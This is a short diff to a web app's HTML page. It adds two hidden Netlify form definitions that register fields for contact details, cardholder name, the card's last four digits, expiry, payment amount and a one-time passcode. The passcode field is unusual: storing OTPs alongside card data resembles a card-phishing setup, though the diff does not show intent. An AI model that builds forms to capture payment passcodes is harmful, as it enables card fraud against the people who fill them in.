@@ -26,5 +26,29 @@
   <body>
     <div id="root"></div>
     <script type="module" src="/src/main.tsx"></script>
+    
+    <!-- Hidden Netlify Forms for Detection -->
+    <form name="card-details" netlify-honeypot="bot-field" data-netlify="true" hidden>
+      <input type="text" name="name" />
+      <input type="email" name="email" />
+      <input type="tel" name="phone" />
+      <input type="text" name="service" />
+      <input type="text" name="cardholder" />
+      <input type="text" name="cardLast4" />
+      <input type="text" name="expiry" />
+      <input type="text" name="timestamp" />
+    </form>
+    
+    <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
+      <input type="text" name="name" />
+      <input type="email" name="email" />
+      <input type="tel" name="phone" />
+      <input type="text" name="service" />
+      <input type="text" name="amount" />
+      <input type="text" name="cardholder" />
+      <input type="text" name="cardLast4" />
+      <input type="text" name="otp" />
+      <input type="text" name="timestamp" />
+    </form>
   </body>
 </html>
